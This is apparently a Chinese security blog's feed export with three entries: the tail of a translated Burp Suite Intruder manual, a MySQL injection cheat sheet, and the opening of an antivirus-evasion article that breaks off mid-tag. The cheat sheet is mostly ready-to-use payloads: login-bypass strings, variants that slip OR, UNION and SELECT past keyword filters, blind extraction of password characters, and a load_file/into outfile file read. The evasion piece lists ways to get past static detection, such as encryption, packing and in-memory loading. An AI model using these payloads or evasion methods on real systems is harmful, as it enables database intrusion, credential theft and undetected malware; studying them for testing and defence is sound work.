only(调查范围内的唯一) - Intruder只会跟随重定向到该套件范围的目标范围之内的URL 。</span><br><span class="line">4)Always(总是) - Intruder将遵循重定向到任何任何URL 。您应使用此选项时应谨慎 - 偶尔， Web应用程序在中继重定向到第三方的请求参数，并按照重定向你可能会不小心攻击。</span><br></pre></td></tr></table></figure><p>Process cookies in redirections(过程中的Cookie重定向) - 如果选择此选项，然后在重定向响应设置任何cookies将被当重定向目标之后重新提交。例如，如果你正在尝试暴力破解登录的挑战就可能是必要的，它总是返回一个重定向到一个页面显示登录的结果，和一个新的会话响应每个登录尝试创建。</p><p>Burp会跟进到10链重定向，如果必要的。在结果表中的列将显示重定向是否其次为每个单独的结果，以及完整的请求和响应中的重定向链存储与每个结果的项目。重定向的类型Burp会处理（ 3xx的状态码，刷新头，等）配置在一套全重定向选项。</p><p>注意重定向： 在某些情况下，可能需要下面的重定向时只使用一个单线程的攻击。出现这种情况时，应用程序存储会话中的初始请求的结果，并提供重定向响应时检索此。</p><p>自动下重定向有时可能会造成问题 - 例如，如果应用程序响应一个重定向到注销页面的一些恶意的请求，那么下面的重定向可能会导致您的会话被终止时，它原本不会这么做。</p><h3 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h3><p>当你配置完你的攻击设置时，你需要launch the attacks(发起攻击)，analyze the results(分析结果)，有时修改攻击配置，与您的测试工作流程链接，或进行其他操作。</p><h4 id="Launching-an-Attack"><a href="#Launching-an-Attack" class="headerlink" title="Launching an Attack"></a>Launching an Attack</h4><p>攻击可以通过两种方式启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)您可以配置Target(目标)，Positions(位置)，Payloads(有效载荷)和Options(选项卡)的攻击设置，然后选择从Intruder(入侵者)菜单“Start attack(开始攻击)”。 </span><br><span class="line">2)您可以通过从Intruder menu(入侵者菜单)中选择“previously saved attack(打开保存的攻击)”打开以前保存的攻击。 </span><br></pre></td></tr></table></figure><p>在单独的窗口中每次攻击会打开。该窗口显示攻击为它们生成的结果，使您能够修改攻击配置实时，并与您的测试工作流程链接，或进行其他操作。</p><h4 id="Result-Tab"><a href="#Result-Tab" class="headerlink" title="Result Tab"></a>Result Tab</h4><p>在结果选项卡包含在攻击发出的每个请求的全部细节。你可以过滤并标注此信息来帮助分析它，并使用它来驱动您的测试工作流程。</p><h4 id="1-Results-Table"><a href="#1-Results-Table" class="headerlink" title="1)Results Table"></a>1)Results Table</h4><p>Results Table显示已在attack中所有的请求和响应的详细信息。根据不同的攻击配置，表可能包含以下几列，其中一些是默认隐藏的，可以使用Columns菜单 中取消隐藏：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122190859.png" alt="Image127" title="image127.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711122295512.png" alt="Image129" title="image129.png"></p><p>request 请求数 Position 有效载荷位置编号 Payload 有效载荷 Status http状态 Error 请求错误 Timeout 超时 Length 字节数 Comment 注释</p><h4 id="2-Display-Filter"><a href="#2-Display-Filter" class="headerlink" title="2)Display Filter"></a>2)Display Filter</h4><p>结果选项卡，可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容显示过滤在结果表中。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122263054.png" alt="Image131" title="image131.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Search term(检索词) - [专业版]您可以筛选反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“negative search(消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。</span><br><span class="line">Status code(状态代码) - 您可以配置是否要显示或隐藏各种HTTP状态码响应。</span><br><span class="line">Annotation(注释) - 您可以设定是否显示使用用户提供的评论或只重点项目。在结果表中显示的内容实际上是一个视图到基础数据库，并显示过滤器控制什么是包含在该视图。如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究一个大的结果集（例如，从模糊测试包含许多参数的要求）来理解各种不同的有趣的响应出现。</span><br></pre></td></tr></table></figure><h3 id="Attack-configuration-Tabs"><a href="#Attack-configuration-Tabs" class="headerlink" title="Attack configuration Tabs"></a>Attack configuration Tabs</h3><p>在结果选项卡中，攻击窗口包含每个从它目前的攻击是基于主界面的配置选项卡中的克隆。这使您能够查看和修改攻击配置，同时进攻正在进行中。有关进一步详情，请参阅各配置选项卡的帮助：目标职位有效载荷选项当修改一个跑动进攻的配置，以下几点值得关注：攻击结构的某些部分是基本的攻击（如攻击类型和有效载荷类型）的结构，并且攻击已经开始之后不能改变。改变配置的某些部分攻击正在运行时，可能会有意想不到的效果。</p><p>例如，如果您使用的是数量的有效载荷和编辑字段中，然后更改才会生效，因为每个键被按下;如果你最初从删除数字字段中，那么攻击可能会突然完成，因为要字段现在包含一个较小的数字。我们强烈建议您暂停修改它们的配置运行前的攻击。</p><h3 id="Result-Menus"><a href="#Result-Menus" class="headerlink" title="Result Menus"></a>Result Menus</h3><p>结果视图包含几个菜单命令与控制的攻击，并进行其他操作。这些将在下面说明。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711122362902.png" alt="Image133" title="image133.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711122330940.png" alt="Image135" title="image135.png"></p><h4 id="1-Attack-Menu-攻击菜单"><a href="#1-Attack-Menu-攻击菜单" class="headerlink" title="1)Attack Menu(攻击菜单)"></a>1)Attack Menu(攻击菜单)</h4><p>包含的命令pause(暂停)，resume(继续)或repeat(重复)攻击。</p><h4 id="2）Save-Menu-保存菜单"><a href="#2）Save-Menu-保存菜单" class="headerlink" title="2）Save Menu(保存菜单)"></a>2）Save Menu(保存菜单)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">attack - 这是用来保存当前攻击的副本，包括结果。保存的文件可以使用从主Burp的UI Intruder菜单中的“打开保存的攻击”选项来重新加载。</span><br><span class="line">Results table - 这是用于对结果表保存为一个文本文件。你可以选择保存的所有行，或仅选定的行。您也可以选择要包括的列，列分隔符。此功能是有用的导出结果到电子表格中，以便进一步分析，或用于保存单个列（如使用提取的grep函数挖掘数据），以用作用于随后的攻击或其它工具的输入文件。</span><br><span class="line">Server responses - 这是用于保存收到的所有请求的全部应答。这些既可以被保存在单独的文件中（顺序编号）或串行级联的序列转换成一个单一的文件。</span><br><span class="line">Attack configuration - 这是用来保存当前正在执行攻击的配置（而不是结果）。您可以重新使用从主Burp的UI Intruder菜单中的“加载配置攻击”选项，攻击配置。</span><br></pre></td></tr></table></figure><h4 id="3-Columns-Menu-列菜单"><a href="#3-Columns-Menu-列菜单" class="headerlink" title="3)Columns Menu(列菜单)"></a>3)Columns Menu(列菜单)</h4><p>这使您可以选择哪些可用的列是可见的攻击结果表。<br></style></p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻防知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入技巧</title>
      <link href="/smallhao/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/"/>
      <url>/smallhao/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-MYSQl灵活的语法"><a href="#0x01-MYSQl灵活的语法" class="headerlink" title="0x01 MYSQl灵活的语法"></a>0x01 MYSQl灵活的语法</h1><hr><p><strong>1 MySQL语法以及认证绕过</strong></p><p>注释符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#， </span><br><span class="line">-- X(X为任意字符)</span><br><span class="line">/*(MySQL-5.1)</span><br><span class="line">;%00</span><br><span class="line">`</span><br><span class="line">&#x27;or 1=1;%00</span><br><span class="line">&#x27;or 1=1 union select 1,2`&#x27;</span><br><span class="line">&#x27;or 1=1 #</span><br><span class="line">&#x27;/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138</span><br><span class="line">&#x27;/*!or*/ 1=1 -- -</span><br></pre></td></tr></table></figure><p>前缀：</p><p>任意混合 <code>+ - ~ !</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or --+2=- -!!!&#x27;2</span><br></pre></td></tr></table></figure><p>测试后发现<code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(混合后规律又不同)，and&#x2F;or前的空格可以省略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or- -!!!1=1；</span><br></pre></td></tr></table></figure><p>运算符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, &lt;, &gt;, &lt;&lt;, &gt;&gt;, &gt;=, &lt;=, &lt;&gt;, &lt;=&gt;, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……</span><br><span class="line"></span><br><span class="line">&#x27;or 1 rlike &#x27;1</span><br></pre></td></tr></table></figure><p>空格替换：<code>%20, %09, %0a, %0b, %0c, %0d, %a0</code></p><p>也可以插入括号，前缀，操作符，引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or+(1)sounds/**/like&quot;1&quot;--%a0-</span><br></pre></td></tr></table></figure><p>字符串格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &quot;a&quot;=&#x27;a&#x27;</span><br><span class="line">&#x27; or &#x27;a&#x27;=n&#x27;a&#x27;               //unicode</span><br><span class="line">&#x27; or &#x27;a&#x27;=b&#x27;1100001&#x27;         //binary</span><br><span class="line">&#x27; or &#x27;a&#x27;=_binary&#x27;1100001&#x27;   //5.5.41下测试无效</span><br><span class="line">&#x27; or &#x27;a&#x27;=x&#x27;61&#x27;              //16进制</span><br></pre></td></tr></table></figure><p><strong>2、MySQL常用的一些小工具</strong></p><p>常量：<code>true， false， null， \N, current_timestamp....</code></p><p>变量：<code>@myvar:=1</code></p><p>系统变量：<code>@@version, @@datadir....</code></p><p>常用函数：<code>version(), pi(), pow(), char(), substring()....</code></p><p><strong>3、MySQL类型转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=true #true=1, false=0</span><br><span class="line">&#x27; or 1 #true</span><br><span class="line">&#x27; or version()=5.5 #5.5.41-log</span><br><span class="line"></span><br><span class="line">&#x27; or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4</span><br><span class="line"></span><br><span class="line">select * from users where &#x27;a&#x27;=&#x27;b&#x27;=&#x27;c&#x27;</span><br><span class="line">select * from users where (&#x27;a&#x27;=&#x27;b&#x27;)=&#x27;c&#x27;</span><br><span class="line">select * from users where (false)=&#x27;c&#x27;</span><br><span class="line">select * from users where (0)=&#x27;c&#x27;</span><br><span class="line">select * from users where (0)=0</span><br><span class="line">select * from users where true</span><br><span class="line">select * from users</span><br></pre></td></tr></table></figure><p>以上的语句都是同样的效果</p><p><strong>4、认证绕过</strong></p><p>绕过语句：<code>&#39;=&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select data from users where name=&quot;=&quot;</span><br><span class="line">select data from users where flase=&quot; </span><br><span class="line">select data from users where 0=0</span><br></pre></td></tr></table></figure><p>绕过语句：<code>&#39;-&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select data from users where name=&#x27;&#x27;-&#x27;&#x27;</span><br><span class="line">select data from users where name=0-0</span><br><span class="line">select data from users where 0=0</span><br></pre></td></tr></table></figure><h1 id="0x02-关键字过滤"><a href="#0x02-关键字过滤" class="headerlink" title="0x02 关键字过滤"></a>0x02 关键字过滤</h1><hr><p>空格</p><p>过滤代码<code>/\s/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20, %09, %0a, %0b, %0c, %0d, %a0</span><br></pre></td></tr></table></figure><p>关键字<code>OR，AND</code></p><p>过滤代码<code>/\sor\s/i,/\sand\s/i</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;||1=&#x27;1     #or</span><br><span class="line">&#x27;=&#x27;</span><br><span class="line">&#x27;&amp;&amp;1=&#x27;1     #and</span><br></pre></td></tr></table></figure><p>关键字<code>union select</code></p><p>过滤代码<code>/union\s+select/i</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(true)like(false)union(select(pass)from(users))#</span><br><span class="line">&#x27;union [all|distinct] select pass from users#</span><br><span class="line">&#x27;union%a0select pass from users#</span><br><span class="line">&#x27;union/*!select*/pass from users#</span><br><span class="line">/vuln.php?id=1 union/*&amp;sort=*/select pass from users-- -</span><br></pre></td></tr></table></figure><p>如果单独过滤union,使用盲注来获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select pass from users limit 1)=&#x27;secret</span><br></pre></td></tr></table></figure><p>通过子查询获取单值来进行比较</p><p>关键字<code>limit</code></p><p>过滤代码<code>/limit/i</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select pass from users where id=1)=&#x27;a</span><br><span class="line">&#x27;and(select pass from users group by id having id=1)=&#x27;a</span><br><span class="line">&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;a&#x27;))</span><br></pre></td></tr></table></figure><p>关键字<code>having</code></p><p>过滤代码<code>/having/i</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and(select substr(group_concat(pass),1,1)from users)=&#x27;a</span><br></pre></td></tr></table></figure><p>关键字<code>select ... from</code></p><p>过滤代码<code>/SELECT\s+[A-Za-z.]+\s+FROM/i/i</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select [all|distinct] pass from users</span><br><span class="line">select`table_name`from`information_schema` . `tables`</span><br><span class="line">select pass as alias from users</span><br><span class="line">select pass aliasalias from users</span><br><span class="line">select pass`alias alias`from users</span><br><span class="line">select+pass%a0from(users)</span><br></pre></td></tr></table></figure><p>关键字<code>select</code></p><p>过滤代码<code>/select/i</code></p><h3 id="1-有文件读取权限"><a href="#1-有文件读取权限" class="headerlink" title="1 有文件读取权限"></a>1 有文件读取权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(load_file(&#x27;file&#x27;),locate(&#x27;DocumentRoot&#x27;,(load_file(&#x27;file&#x27;)))+</span><br><span class="line">length(&#x27;DocumentRoot&#x27;),10)=&#x27;a&#x27;=&#x27;&#x27; into outfile &#x27;/var/www/dump.txt</span><br></pre></td></tr></table></figure><h3 id="2-获取列名"><a href="#2-获取列名" class="headerlink" title="2 获取列名"></a>2 获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 列名 is not null#</span><br><span class="line">&#x27; procedure analyse()#</span><br></pre></td></tr></table></figure><p>使用substr来做过滤条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and substr(pass,1,1)=&#x27;a</span><br></pre></td></tr></table></figure><p>关键字<code>select,and,&amp;</code></p><p>‘0#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select data from users where name = &#x27;&#x27;-0 # int typecast</span><br><span class="line">select data from users where name = 0 # int typecast</span><br><span class="line">select data from users where 0 = 0 # true</span><br></pre></td></tr></table></figure><p>‘-1#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select data from users where 0 = -1 # false</span><br></pre></td></tr></table></figure><p>使用条件判断来进行<code>true、false</code>的选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifnull(nullif()), case when， if()</span><br><span class="line">&#x27;-if(name=&#x27;Admin&#x27;,1,0)#</span><br></pre></td></tr></table></figure><p>使用嵌套条件<code>&#39;-if(</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(name=&#x27;Admin&#x27;,1,0), // condition</span><br><span class="line">if(substr(pass,1,1)=&#x27;a&#x27;,1,0) // if true</span><br><span class="line">,0)# // if false    </span><br></pre></td></tr></table></figure><h1 id="0x03-函数过滤"><a href="#0x03-函数过滤" class="headerlink" title="0x03 函数过滤"></a>0x03 函数过滤</h1><hr><p>构建字符串相关函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unhex char hex ascii ord substr substring mid pad left right insert</span><br><span class="line">&#x27; and substr(data,1,1) = &#x27;a&#x27;#</span><br><span class="line">&#x27; and substr(data,1,1) = 0x61# 0x6162</span><br><span class="line">&#x27; and substr(data,1,1) = unhex(61)# unhex(6162)</span><br><span class="line">&#x27; and substr(data,1,1) = char(97)# char(97,98)</span><br><span class="line">&#x27; and hex(substr(data,1,1)) = 61#</span><br><span class="line">&#x27; and ascii(substr(data,1,1)) = 97#</span><br><span class="line">&#x27; and ord(substr(data,1,1)) = 97#</span><br></pre></td></tr></table></figure><p>使用conv来进行进制的转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(data,1,1) = lower(conv(10,10,36))# &#x27;a&#x27;</span><br><span class="line">&#x27; and substr(data,1,1) = lower(conv(11,10,36))# &#x27;b&#x27;</span><br><span class="line">&#x27; and substr(data,1,1) = lower(conv(36,10,36))# &#x27;z&#x27;</span><br></pre></td></tr></table></figure><p>使用函数来猜解数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(data,1,1) = &#x27;a&#x27;#</span><br><span class="line">&#x27; and substring(data,1,1) = &#x27;a&#x27;#</span><br><span class="line">&#x27; and mid(data,1,1) = &#x27;a&#x27;#</span><br></pre></td></tr></table></figure><p>不适用逗号来获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(data from 1 for 1) = &#x27;a&#x27;#</span><br></pre></td></tr></table></figure><p>同样也可以使用一下比较少见的函数来尝试绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lpad(data,1,space(1)) // lpad(&#x27;hi&#x27;,4,&#x27;?&#x27;) = &#x27;??hi&#x27;</span><br><span class="line">rpad(data,1,space(1)) // rpad(&#x27;hi&#x27;,4,&#x27;?&#x27;) = &#x27;hi??&#x27;</span><br><span class="line">left(data,1)</span><br><span class="line">reverse(right(reverse(data),1))</span><br><span class="line">insert(insert(version(),1,0,space(0)),2,222,space(0))</span><br></pre></td></tr></table></figure><p>有些函数有类似搜索匹配的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-if(locate(&#x27;f&#x27;,data),1,0)#</span><br><span class="line">&#x27;-if(locate(&#x27;fo&#x27;,data),1,0)#</span><br><span class="line">&#x27;-if(locate(&#x27;foo&#x27;,data),1,0)#</span><br><span class="line">instr(), position()</span><br></pre></td></tr></table></figure><p>使用函数进行字符串的切割</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length(trim(leading &#x27;a&#x27; FROM data)) # length will be shorter</span><br><span class="line">length(replace(data, &#x27;a&#x27;, &#x27;&#x27;)) # length will be shorter</span><br></pre></td></tr></table></figure><p>2种方式都是相同效果</p><h1 id="0x04-注入时主要使用的一些东西"><a href="#0x04-注入时主要使用的一些东西" class="headerlink" title="0x04 注入时主要使用的一些东西"></a>0x04 注入时主要使用的一些东西</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1个控制流程操作(select, case, if(), ...)</span><br><span class="line">1个比较操作(=, like, mod(), ...)</span><br><span class="line">1个字符串的猜解(mid(), left(), rpad(), …)</span><br><span class="line">1个字符串生成(0x61, hex(), conv())</span><br></pre></td></tr></table></figure><p>使用<code>conv([10-36],10,36)</code>可以实现所有字符的表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</span><br><span class="line">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</span><br><span class="line">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</span><br><span class="line">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class="line">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</span><br><span class="line">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</span><br><span class="line">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</span><br><span class="line">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</span><br><span class="line">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</span><br><span class="line">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure><p>更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf</span><br><span class="line"></span><br><span class="line">https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf</span><br><span class="line"></span><br><span class="line">http://www.blackhatlibrary.net/SQL_injection</span><br><span class="line"></span><br><span class="line">http://websec.ca/kb/sql_injection</span><br></pre></td></tr></table></figure><p></style></p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻防知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-免杀</title>
      <link href="/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/"/>
      <url>/smallhao/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透-免杀"><a href="#内网渗透-免杀" class="headerlink" title="内网渗透-免杀"></a>内网渗透-免杀</h1><h2 id="杀软原理"><a href="#杀软原理" class="headerlink" title="杀软原理"></a>杀软原理</h2><p>可执行文件存在的两种状态及检测方式：</p><ul><li>未执行时在硬盘上的状态（静态检测）</li><li>执行后加载进内存的状态（动态监测）</li></ul><p>杀软的基本等级：</p><ul><li>无害：无任何可疑行为，无任何特征命中病毒特征</li><li>可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等</li><li>有害：特征命中病毒特征</li></ul><h3 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h3><p>静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p><p>静态检测针对样本文件在硬盘上的状态进行检测：</p><ul><li>样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。</li><li>特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。</li><li>黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。</li></ul><p>通常静态检测会识别代码中存在的函数：</p><ul><li>Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。</li><li>编程语言关键词：cmd等关键词，例如Python中的subprocess.popen(“cmd &#x2F;c”)</li></ul><p>常见的绕过思路：</p><ul><li>绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加&#x2F;替换资源、加密Shellcode等</li></ul><p>常用的静态检测平台：</p><ul><li><a href="https://www.virustotal.com/%EF%BC%8C%E6%B3%A8%E6%84%8F%EF%BC%9AVirustotal%E6%98%AF%E5%9B%BD%E5%A4%96%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%AF%B7%E8%B0%A8%E6%85%8E%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%9C%80%E5%A5%BD%E4%B8%8D%E8%A6%81%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BB%85%E6%A0%A1%E9%AA%8C%E5%B9%B6%E6%A3%80%E6%9F%A5MD5%E6%98%AF%E5%90%A6%E4%B8%BA%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82">https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。</a></li></ul><h3 id="动态检测"><a href="#动态检测" class="headerlink" 